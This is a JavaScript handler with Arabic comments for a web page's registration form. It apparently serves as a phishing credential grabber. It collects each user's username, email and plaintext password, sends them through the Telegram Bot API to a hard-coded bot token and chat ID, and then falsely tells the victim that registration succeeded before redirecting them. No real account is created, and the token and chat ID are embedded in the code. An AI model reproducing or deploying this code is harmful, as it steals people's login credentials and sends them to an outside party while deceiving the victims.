document.getElementById("registerForm").addEventListener("submit", function(event) {
    event.preventDefault();  // منع إعادة تحميل الصفحة

    let username = document.getElementById("username").value;
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    // تأكد من أن البيانات ليست فارغة
    if (!username || !email || !password) {
        alert("يرجى ملء جميع الحقول.");
        return;
    }

    // إعداد بيانات الرسالة
    let botToken = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y";  // استبدل هذا بالتوكن الفعلي للبوت
    let chatId = "7302541527";  // استبدل هذا بمعرف الشات الخاص بك
    let message = `🔹 مستخدم جديد 🔹\n👤 الاسم: ${username}\n📧 البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}`;

    // إرسال الطلب إلى تيليجرام
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert("تم التسجيل بنجاح!");
            window.location.href = "index.html";  // إعادة التوجيه إلى الصفحة الرئيسية
        } else {
            alert("حدث خطأ أثناء التسجيل.");
        }
    })
    .catch(error => {
        console.error("خطأ في الإرسال:", error);
        alert("تعذر الاتصال بالسيرفر.");
    });
});
